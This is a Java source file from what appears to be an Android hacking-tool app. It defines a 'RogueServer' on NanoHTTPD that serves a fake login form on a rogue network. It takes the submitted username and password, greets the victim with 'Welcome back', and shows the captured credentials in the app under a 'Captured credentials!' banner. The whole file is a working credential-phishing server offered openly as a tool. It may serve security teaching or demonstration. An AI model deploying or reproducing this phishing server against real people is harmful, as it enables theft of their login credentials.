package com.izoman.hcktool.expert.roguenetwork;

import android.os.Handler;
import android.util.Log;
import android.widget.TextView;

import org.nanohttpd.protocols.http.IHTTPSession;
import org.nanohttpd.protocols.http.NanoHTTPD;
import org.nanohttpd.protocols.http.response.Response;

import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.nanohttpd.protocols.http.response.Response.newFixedLengthResponse;

/**
 * Created by umuts on 10-Aug-17.
 */

public class RogueServer extends NanoHTTPD {
    TextView output;
    private Handler mHandler;


    public RogueServer(int port, Handler mHandler, TextView output) {
        super(port);
        this.mHandler = mHandler;
        this.output = output;
    }

    @Override
    public Response serve(IHTTPSession session) {
        String msg = "<html><body><h1>Rogue server</h1>\n";
        try {
            session.parseBody(new HashMap<String, String>());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ResponseException e) {
            e.printStackTrace();
        }
        // Let's get the goodies from post :)
        Map<String, List<String>> params = session.getParameters();
        if (params.get("username") == null || params.get("password") == null) {
            msg += "<form action='" + session.getUri() + "' method='post' enctype='multipart/form-data'>\n";
            msg += "<p>Your username: <input type='text' name='username'></p>\n";
            msg += "<p>Your password: <input type='password' name='password'></p>\n";
            msg += "<input type='submit' value='Submit'>\n";
            msg += "</form>\n";
        } else {
            msg += "<p>Welcome back, " + params.get("username").get(0) + "!</p>";
            final String  username = params.get("username").get(0);
            final String  password = params.get("password").get(0);
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    // Update UI
                    output.append("-*-*-*-*-*Captured credentials!-*-*-*-*-*\n");
                    output.append("Username: " +username+ "\n");
                    output.append("Password: " + password + "\n");
                }
            });
        }
        return newFixedLengthResponse( msg + "</body></html>\n" );
    }
}
